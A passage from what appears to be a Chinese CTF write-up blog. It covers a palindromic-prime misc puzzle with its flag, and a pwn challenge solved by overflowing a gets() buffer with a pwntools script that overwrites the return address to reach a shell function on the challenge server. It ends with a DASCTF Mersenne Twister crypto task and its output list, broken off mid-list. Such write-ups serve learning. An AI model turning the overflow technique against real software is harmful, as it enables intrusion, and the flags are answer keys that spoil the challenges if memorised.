7位</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                temp = <span class="hljs-number">1000001</span>*n+<span class="hljs-number">100010</span>*m+<span class="hljs-number">10100</span>*k+<span class="hljs-number">1000</span>*p<br>                <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                    Palind.append(temp)<br><span class="hljs-comment"># 8位</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                temp = <span class="hljs-number">10000001</span>*n+<span class="hljs-number">1000010</span>*m+<span class="hljs-number">100100</span>*k+<span class="hljs-number">11000</span>*p<br>                <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                    Palind.append(temp)<br><span class="hljs-comment"># 9位</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                    temp = <span class="hljs-number">100000001</span>*n+<span class="hljs-number">10000010</span>*m+<span class="hljs-number">1000100</span>*k+<span class="hljs-number">101000</span>*p+<span class="hljs-number">10000</span>*q<br>                    <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                        Palind.append(temp)<br>                    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Palind:<br>    mydigit = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>,<span class="hljs-built_in">list</span>(<span class="hljs-built_in">str</span>(i)))))<br>    <span class="hljs-keyword">if</span> mydigit == <span class="hljs-number">58</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>跑完之后有很多结果。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">9888889</span><br><span class="hljs-number">9896989</span><br><span class="hljs-number">9978799</span><br><span class="hljs-number">178989871</span><br><span class="hljs-number">179969971</span><br><span class="hljs-number">188888881</span><br><span class="hljs-number">189787981</span><br>...<br>...<br>...<br></code></pre></td></tr></table></figure><p>回到提示信息，三个密码只有一个是正确的。在我们的输出结果中，七位的满足要求的数只有三个，猜测可能就是这三个其中的一个。</p><p>尝试了一下第一个数，发现就是flag。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>: ctfshow&#123;<span class="hljs-number">9888889</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="pwn签到"><a class="markdownIt-Anchor" href="#pwn签到"></a> pwn签到</h2><p>IDA打开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(byte_8048668);<br>  dsb(&amp;argc);<br>  <span class="hljs-built_in">puts</span>(asc_8048694);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入dsb。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">dsb</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br><br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里一个溢出漏洞。函数列表中有一个shell_here函数。所以我们直接用shell_here的地址盖返回地址就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><br><span class="hljs-keyword">import</span> pwn<br><br>r = pwn.remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="hljs-number">28175</span>)<br>r.send(<span class="hljs-string">b&quot;\xf6\x84\x04\x08&quot;</span>*<span class="hljs-number">6</span>)<br><br>r.interactive()<br><br><span class="hljs-comment"># ctfshow&#123;19d0be7b-3f2d-48e6-a8f6-186af1f41177&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022DASCTF MAY 出题人挑战赛</title>
    <link href="/2022/05/21/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2022/05/21/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>2022DASCTF MAY 出题人挑战赛中 Yusa的密码学课堂——一见如故 的题解。</p><span id="more"></span><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="yusa的密码学课堂一见如故"><a class="markdownIt-Anchor" href="#yusa的密码学课堂一见如故"></a> Yusa的密码学课堂——一见如故</h2><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Myrand</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,seed</span>):<br>self.index = <span class="hljs-number">0</span><br>self.isInit = <span class="hljs-number">1</span><br>self.MT = [seed] + [<span class="hljs-number">0</span>] * <span class="hljs-number">623</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">624</span>):<br>t = <span class="hljs-number">1314433253</span> * (self.MT[i-<span class="hljs-number">1</span>] ^ (self.MT[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) + <span class="hljs-number">1</span><br>self.MT[i] = t &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>y = (self.MT[i] &amp; <span class="hljs-number">0x80000000</span>) + (self.MT[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>self.MT[i] = self.MT[(i+<span class="hljs-number">397</span>)%<span class="hljs-number">624</span>] ^ (y &gt;&gt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> y &amp; <span class="hljs-number">1</span>:<br>self.MT[i] ^= <span class="hljs-number">2567483520</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">if</span> self.index == <span class="hljs-number">0</span>:<br>self.generate()<br>y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br>self.index = (self.index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br><span class="hljs-keyword">return</span> y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2l</span>(<span class="hljs-params">self, y, shift</span>):<br><span class="hljs-keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2r</span>(<span class="hljs-params">self, y, shift</span>):<br><span class="hljs-keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><span class="hljs-keyword">import</span> os<br>r = Myrand(<span class="hljs-built_in">int</span>(os.urandom(<span class="hljs-number">4</span>).<span class="hljs-built_in">hex</span>(),<span class="hljs-number">16</span>))<br>out = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>out.append(r.rand())<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>f.write(<span class="hljs-built_in">str</span>(out))<br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>flag = <span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="hljs-built_in">str</span>(r.rand()).encode()).hexdigest() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>文件里面是输出的rand数。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">[<span class="hljs-number">3417500333</span>, <span class="hljs-number">4091726338</span>, <span class="hljs-number">652603332</span>, <span class="hljs-number">4187304543</span>, <span class="hljs-number">4293795290</span>, <span class="hljs-number">1622245003</span>, <span class="hljs-number">3383443782</span>, <span class="hljs-number">2420250331</span>, <span class="hljs-number">322010852</span>, <span class="hljs-number">1604005753</span>, <span class="hljs-number">3137930218</span>, <span class="hljs-number">1074571824</span>, <span class="hljs-number">1566336258</span>, <span class="hljs-number">2754341076</span>, <span class="hljs-number">1059426660</span>, <span class="hljs-number">2461569360</span>, <span class="hljs-number">613134153</span>, <span class="hljs-number">860561774</span>, <span class="hljs-number">3003069274</span>, <span class="hljs-number">553387944</span>, <span class="hljs-number">1949778231</span>, <span class="hljs-number">249886857</span>, <span class="hljs-number">2322866121</span>, <span class="hljs-number">3685855175</span>, <span class="hljs-number">1977923546</span>, <span class="hljs-number">1887238269</span>, <span class="hljs-number">253812990</span>, <span class="hljs-number">2188417674</span>, <span class="hljs-number">2718707711</span>, <span class="hljs-number">1599975569</span>, <span class="hljs-number">3254935456</span>, <span class="hljs-number">3199641169</span>, <span class="hljs-number">362166522</span>, <span class="hljs-number">1378687155</span>, <span class="hljs-number">912036995</span>, <span class="hljs-number">3174049018</span>, <span class="hljs-number">780042016</span>, <span class="hljs-number">970421905</span>, <span class="hljs-number">3468971406</span>, <span class="hljs-number">801660807</span>, <span class="hljs-number">833926127</span>, <span class="hljs-number">473587885</span>, <span class="hljs-number">158979812</span>, <span class="hljs-number">405306558</span>, <span class="hljs-number">1363084996</span>, <span class="hljs-number">2023076543</span>, <span class="hljs-number">2069797730</span>, <span class="hljs-number">718155249</span>, <span class="hljs-number">1641186127</span>, <span class="hljs-number">3616747747</span>, <span class="hljs-number">1575693921</span>, <span class="hljs-number">3856591855</span>, <span class="hljs-number">223881884</span>, <span class="hljs-number">3002184567</span>, <span class="hljs-number">1666647440</span>, <span class="hljs-number">617661934</span>, <span class="hljs-number">2673101022</span>, <span class="hljs-number">885332395</span>, <span class="hljs-number">3391329168</span>, <span class="hljs-number">1640225363</span>, <span class="hljs-number">2565685644</span>, <span class="hljs-number">3892963352</span>, <span class="hljs-number">3034627488</span>, <span class="hljs-number">2415435183</span>, <span class="hljs-number">3648712566</span>, <span class="hljs-number">2140877952</span>, <span class="hljs-number">1303506086</span>, <span class="hljs-number">2455662362</span>, <span class="hljs-number">1720382700</span>, <span class="hljs-number">3970268445</span>, <span class="hljs-number">2579167586</span>, <span class="hljs-number">4117229324</span>, <span class="hljs-number">846645263</span>, <span class="hljs-number">3252991293</span>, <span class="hljs-number">79067029</span>, <span class="hljs-number">2756800392</span>, <span class="hljs-number">2212447526</span>, <span class="hljs-number">2203329967</span>, <span class="hljs-number">1270408703</span>, <span class="hljs-number">740176928</span>, <span class="hljs-number">3176125705</span>, <span class="hljs-number">166800854</span>, <span class="hljs-number">3327343902</span>, <span class="hljs-number">2079714725</span>, <span class="hljs-number">3702269956</span>, <span class="hljs-number">3659849279</span>, <span class="hljs-number">3658666909</span>, <span class="hljs-number">797535816</span>, <span class="hljs-number">600857570</span>, <span class="hljs-number">553836307</span>, <span class="hljs-number">2394740468</span>, <span class="hljs-number">1178393549</span>, <span class="hljs-number">2183765310</span>, <span class="hljs-number">4014432190</span>, <span class="hljs-number">652246726</span>, <span class="hljs-number">3693235932</span>, <span class="hljs-number">4046942361</span>, <span class="hljs-number">4105444828</span>, <span class="hljs-number">145386213</span>, <span class="hljs-number">1198390220</span>, <span class="hljs-number">3023119098</span>, <span class="hljs-number">663559283</span>, <span class="hljs-number">225958361</span>, <span class="hljs-number">3893000878</span>, <span class="hljs-number">1615631644</span>, <span class="hljs-number">1941951859</span>, <span class="hljs-number">471085675</span>, <span class="hljs-number">2164362049</span>, <span class="hljs-number">4274234562</span>, <span class="hljs-number">4127314557</span>, <span class="hljs-number">1833529303</span>, <span class="hljs-number">17668093</span>, <span class="hljs-number">3208743142</span>, <span class="hljs-number">3210135945</span>, <span class="hljs-number">1772990736</span>, <span class="hljs-number">3290157875</span>, <span class="hljs-number">3006334453</span>, <span class="hljs-number">3831748800</span>, <span class="hljs-number">1120411838</span>, <span class="hljs-number">690279329</span>, <span class="hljs-number">2436940844</span>, <span class="hljs-number">1440602808</span>, <span class="hljs-number">1552272917</span>, <span class="hljs-number">1321728089</span>, <span class="hljs-number">524486126</span>, <span class="hljs-number">3696307959</span>, <span class="hljs-number">1189129368</span>, <span class="hljs-number">28736041</span>, <span class="hljs-number">3143264315</span>, <span class="hljs-number">3050323849</span>, <span class="hljs-number">1458456612</span>, <span class="hljs-number">389869312</span>, <span class="hljs-number">2360130428</span>, <span class="hljs-number">854837117</span>, <span class="hljs-number">1270423403</span>, <span class="hljs-number">3471650414</span>, <span class="hljs-number">243573262</span>, <span class="hljs-number">3449929772</span>, <span class="hljs-number">2436299611</span>, <span class="hljs-number">420972940</span>, <span class="hljs-number">923873821</span>, <span class="hljs-number">3499748829</span>, <span class="hljs-number">2470333529</span>, <span class="hljs-number">3901870125</span>, <span class="hljs-number">3589884387</span>, <span class="hljs-number">3339475693</span>, <span class="hljs-number">1526947412</span>, <span class="hljs-number">1747516667</span>, <span class="hljs-number">2971536797</span>, <span class="hljs-number">273910310</span>, <span class="hljs-number">2185887289</span>, <span class="hljs-number">2723697010</span>, <span class="hljs-number">1973585459</span>, <span class="hljs-number">1166325256</span>, <span class="hljs-number">1360822059</span>, <span class="hljs-number">416514510</span>, <span class="hljs-number">4038763765</span>, <span class="hljs-number">1816380840</span>, <span class="hljs-number">940152644</span>, <span class="hljs-number">3918708431</span>, <span class="hljs-number">3410593321</span>, <span class="hljs-number">3358844522</span>, <span class="hljs-number">3678637784</span>, <span class="hljs-number">2412834780</span>, <span class="hljs-number">3052967117</span>, <span class="hljs-number">3672611162</span>, <span class="hljs-number">570069042</span>, <span class="hljs-number">95771608</span>, <span class="hljs-number">1210821251</span>, <span class="hljs-number">2163778365</span>, <span class="hljs-number">2739972546</span>, <span class="hljs-number">3094346015</span>, <span class="hljs-number">749719666</span>, <span class="hljs-number">1697477587</span>, <span class="hljs-number">986142486</span>, <span class="hljs-number">2591897292</span>, <span class="hljs-number">1234948693</span>, <span class="hljs-number">3659791160</span>, <span class="hljs-number">3990257960</span>, <span class="hljs-number">501199958</span>, <span class="hljs-number">3029961497</span>, <span class="hljs-number">578415668</span>, <span class="hljs-number">124517322</span>, <span class="hljs-number">1985205894</span>, <span class="hljs-number">3777347400</span>, <span class="hljs-number">1149995545</span>, <span class="hljs-number">290699775</span>, <span class="hljs-number">3399696193</span>, <span class="hljs-number">1062094395</span>, <span class="hljs-number">2896523484</span>, <span class="hljs-number">1562688856</span>, <span class="hljs-number">992098141</span>, <span class="hljs-number">3941170280</span>, <span class="hljs-number">262596967</span>, <span class="hljs-number">2585751001</span>, <span class="hljs-number">3682611205</span>, <span class="hljs-number">530523926</span>, <span class="hljs-number">1202322766</span>, <span class="hljs-number">3777439514</span>, <span class="hljs-number">3051700271</span>, <span class="hljs-number">261632458</span>, <span class="hljs-number">2736123960</span>, <span class="hljs-number">2786338595</span>, <span class="hljs-number">86310784</span>, <span class="hljs-number">2760191516</span>, <span class="hljs-number">1344514731</span>, <span class="hljs-number">350767781</span>, <span class="hljs-number">2858876127</span>, <span class="hljs-number">519088864</span>, <span class="hljs-number">3193340756</span>, <span class="hljs-number">3563489312</span>, <span class="hljs-number">3239917298</span>, <span class="hljs-number">161418824</span>, <span class="hljs-number">470724403</span>, <span class="hljs-number">3310407387</span>, <span class="hljs-number">1743713887</span>, <span class="hljs-number">3064036770</span>, <span class="hljs-number">1175434157</span>, <span class="hljs-number">3029464330</span>, <span class="hljs-number">116086349</span>, <span class="hljs-number">1652489862</span>, <span class="hljs-number">1176236897</span>, <span class="hljs-number">4139800383</span>, <span class="hljs-number">3758499033</span>, <span class="hljs-number">2961626313</span>, <span class="hljs-number">3064683859</span>, <span class="hljs-number">958478146</span>, <span class="hljs-number">596650527</span>, <span class="hljs-number">1000277312</span>, <span class="hljs-number">4102368994</span>, <span class="hljs-number">1480011430</span>, <span class="hljs-number">4001401502</span>, <span class="hljs-number">4004287177</span>, <span class="hljs-number">3202905309</span>, <span class="hljs-number">1754655955</span>, <span class="hljs-number">2064262245</span>, <span class="hljs-number">1840530874</span>, <span class="hljs-number">2284428117</span>, <span class="hljs-number">2281854453</span>, <span class="hljs-number">1023839768</span>, <span class="hljs-number">2166517711</span>, <span class="hljs-number">2709857675</span>, <span class="hljs-number">2005014414</span>, <span class="hljs-number">4161461001</span>, <span class="hljs-number">2932436148</span>, <span class="hljs-number">2411599350</span>, <span class="hljs-number">4267437788</span>, <span class="hljs-number">2132764972</span>, <span class="hljs-number">150665266</span>, <span class="hljs-number">286170947</span>, <span class="hljs-number">2249288787</span>, <span class="hljs-number">3953585886</span>, <span class="hljs-number">1231725143</span>, <span class="hljs-number">2479045931</span>, <span class="hljs-number">2377059462</span>, <span class="hljs-number">281316188</span>, <span class="hljs-number">379113422</span>, <span class="hljs-number">920019004</span>, <span class="hljs-number">163289886</span>, <span class="hljs-number">2210874762</span>, <span class="hljs-number">1578529538</span>, <span class="hljs-number">309521495</span>, <span class="hljs-number">3737017316</span>, <span class="hljs-number">88919917</span>, <span class="hljs-number">559742618</span>, <span class="hljs-number">978230553</span>, <span class="hljs-number">2154491496</span>, <span class="hljs-number">994913727</span>, <span class="hljs-number">498894258</span>, <span class="hljs-number">1355546448</span>, <span class="hljs-number">4023836881</span>, <span class="hljs-number">3014313787</span>, <span class="hljs-number">164044564</span>, <span class="hljs-number">2408825840</span>, <span class="hljs-number">2029992558</span>, <span class="hljs-number">3707778216</span>, <span class="hljs-number">86206872</span>, <span class="hljs-number">3576935874</span>, <span class="hljs-number">185356787</span>, <span class="hljs-number">1774175910</span>, <span class="hljs-number">3145237900</span>, <span class="hljs-number">3497547609</span>, <span class="hljs-number">841914878</span>, <span class="hljs-number">3425254534</span>, <span class="hljs-number">4264030778</span>, <span class="hljs-number">2348022032</span>, <span class="hljs-number">178331591</span>, <span class="hljs-number">943923822</span>, <span class="hljs-number">3384367749</span>, <span class="hljs-number">2806712599</span>, <span class="hljs-number">1178535099</span>, <span class="hljs-number">1251085540</span>, <span class="hljs-number">2410015803</span>, <span class="hljs-number">1480595408</span>, <span class="hljs-number">2732607876</span>, <span class="hljs-number">1579706357</span>, <span class="hljs-number">870791724</span>, <span class="hljs-number">2320512780</span>, <span class="hljs-number">2149666862</span>, <span class="hljs-number">3797999384</span>, <span class="hljs-number">3905363134</span>, <span class="hljs-number">3388169321</span>, <span class="hljs-number">851973359</span>, <span class="hljs-number">1418716205</span>, <span class="hljs-number">207581030</span>, <span class="hljs-number">1740441523</span>, <span class="hljs-number">1173839013</span>, <span class="hljs-number">4280610104</span>, <span class="hljs-number">1769134281</span>, <span class="hljs-number">1758916333</span>, <span class="hljs-number">4061069248</span>, <span class="hljs-number">2147554262</span>, <span class="hljs-number">2749007447</span>, <span class="hljs-number">909878569</span>, <span class="hljs-number">2054562584</span>, <span class="hljs-number">1515003000</span>, <span class="hljs-number">560286390</span>, <span class="hljs-number">2482663802</span>, <span class="hljs-number">2690882951</span>, <span class="hljs-number">3298162668</span>, <span class="hljs-number">2561737261</span>, <span class="hljs-number">167825221</span>, <span class="hljs-number">507375343</span>, <span class="hljs-number">2179952491</span>, <span class="hljs-number">795452860</span>, <span class="hljs-number">2877704207</span>, <span class="hljs-number">3243106071</span>, <span class="hljs-number">1633372043</span>, <span class="hljs-number">2152178033</span>, <span class="hljs-number">2993246714</span>, <span class="hljs-number">4176238981</span>, <span class="hljs-number">3828458887</span>, <span class="hljs-number">695369535</span>, <span class="hljs-number">2514762808</span>, <span class="hljs-number">2251430819</span>, <span class="hljs-number">2743651063</span>, <span class="hljs-number">783239046</span>, <span class="hljs-number">4036497041</span>, <span class="hljs-number">2175424426</span>, <span class="hljs-number">765021321</span>, <span class="hljs-number">897227922</span>, <span class="hljs-number">3192938155</span>, <span class="hljs-number">4173350810</span>, <span class="hljs-number">2290496185</span>, <span class="hljs-number">4215986056</span>, <span class="hljs-number">2448481441</span>, <span class="hljs-number">3114984799</span>, <span class="hljs-number">2920066349</span>, <span class="hljs-number">722868808</span>, <span class="hljs-number">594363801</span>, <span class="hljs-number">4012575088</span>, <span class="hljs-number">454547939</span>, <span class="hljs-number">3331771662</span>, <span class="hljs-number">1267229957</span>, <span class="hljs-number">3170277692</span>, <span class="hljs-number">2446344734</span>, <span class="hljs-number">3730529788</span>, <span class="hljs-number">2621611481</span>, <span class="hljs-number">2972284304</span>, <span class="hljs-number">2580290241</span>, <span class="hljs-number">486727007</span>, <span class="hljs-number">2727955445</span>, <span class="hljs-number">1457071884</span>, <span class="hljs-number">1053028185</span>, <span class="hljs-number">462301682</span>, <span class="hljs-number">3907840756</span>, <span class="hljs-number">1832398102</span>, <span class="hljs-number">3144685297</span>, <span class="hljs-number">3403964915</span>, <span class="hljs-number">4263570498</span>, <span class="hljs-number">792776003</span>, <span class="hljs-number">306771255</span>, <span class="hljs-number">1633688240</span>, <span class="hljs-number">2159479271</span>, <span class="hljs-number">942060576</span>, <span class="hljs-number">1311531808</span>, <span class="hljs-number">3145754189</span>, <span class="hljs-number">4142271069</span>, <span class="hljs-number">2844524541</span>, <span class="hljs-number">4082439147</span>, <span class="hljs-number">2847276716</span>, <span class="hljs-number">1374436698</span>, <span class="hljs-number">2601522390</span>, <span class="hljs-number">529644524</span>, <span class="hljs-number">206090172</span>, <span class="hljs-number">3015114937</span>, <span class="hljs-number">4137169373</span>, <span class="hljs-number">2600331537</span>, <span class="hljs-number">344659140</span>, <span class="hljs-number">155319271</span>, <span class="hljs-number">1724932164</span>, <span class="hljs-number">3187877676</span>, <span class="hljs-number">4020168431</span>, <span class="hljs-number">711431575</span>, <span class="hljs-number">4123955169</span>, <span class="hljs-number">2539963709</span>, <span class="hljs-number">2764832709</span>, <span class="hljs-number">3897838285</span>, <span class="hljs-number">2521203644</span>, <span class="hljs-number">2059212822</span>, <span class="hljs-number">1129046005</span>, <span class="hljs-number">3277260664</span>, <span class="hljs-number">2739869189</span>, <span class="hljs-number">1955591901</span>, <span class="hljs-number">2661672178</span>, <span class="hljs-number">2926355273</span>, <span class="hljs-number">28176978</span>, <span class="hljs-number">706409211</span>, <span class="hljs-number">1432061304</span>, <span class="hljs-number">26517996</span>, <span class="hljs-number">3180196905</span>, <span class="hljs-number">2178525849</span>, <span class="hljs-number">607854674</span>, <span class="hljs-number">3953350517</span>, <span class="hljs-number">3532394548</span>, <span class="hljs-number">4175940932</span>, <span class="hljs-number">626671309</span>, <span class="hljs-number">1273934270</span>, <span class="hljs-number">3481828801</span>, <span class="hljs-number">22643989</span>, <span class="hljs-number">2104739013</span>, <span class="hljs-number">4183577772</span>, <span class="hljs-number">3932721637</span>, <span class="hljs-number">3075788222</span>, <span class="hljs-number">2814353001</span>, <span class="hljs-number">4120869721</span>, <span class="hljs-number">2045506903</span>, <span class="hljs-number">603494333</span>, <span class="hljs-number">335162960</span>, <span class="hljs-number">2069261279</span>, <span class="hljs-number">2278614835</span>, <span class="hljs-number">210140447</span>, <span class="hljs-number">2012566692</span>, <span class="hljs-number">2345710126</span>, <span class="hljs-number">70390387</span>, <span class="hljs-number">457247932</span>, <span class="hljs-number">2764651800</span>, <span class="hljs-number">652766919</span>, <span class="hljs-number">555253440</span>, <span class="hljs-number">864036913</span>, <span class="hljs-number">1720142260</span>, <span class="hljs-number">453262569</span>, <span class="hljs-number">1113437101</span>, <span class="hljs-number">2576419688</span>, <span class="hljs-number">144008475</span>, <span class="hljs-number">1786881829</span>, <span class="hljs-number">2455128823</span>, <span class="hljs-number">2884922345</span>, <span class="hljs-number">4251332234</span>, <span class="hljs-number">58949785</span>, <span class="hljs-number">4206002785</span>, <span class="hljs-number">3374754553</span>, <span class="hljs-number">2976162198</span>, <span class="hljs-number">546450687</span>, <span class="hljs-number">1268444784</span>, <span class="hljs-number">4132330381</span>, <span class="hljs-number">3404894280</span>, <span class="hljs-number">2421962142</span>, <span class="hljs-number">212361299</span>, <span class="hljs-number">2526283704</span>, <span class="hljs-number">1656118437</span>, <span class="hljs-number">1249336298</span>, <span class="hljs-number">305885855</span>, <span class="hljs-number">1090758249</span>, <span class="hljs-number">3752057640</span>, <span class="hljs-number">3508190692</span>, <span class="hljs-number">3637428</span>, <span class="hljs-number">105102422</span>, <span class="hljs-number">2247418237</span>, <span class="hljs-number">1873609555</span>, <span class="hljs-number">1206760240</span>, <span class="hljs-number">3761689119</span>, <span class="hljs-number">3151616638</span>, <span class="hljs-number">1711308858</span>, <span class="hljs-number">1261541178</span>, <span class="hljs-number">1843103377</span>, <span class="hljs-number">3158893523</span>, <span class="hljs-number">1226253110</span>, <span class="hljs-number">3337577909</span>, <span class="hljs-number">126612372</span>, <span 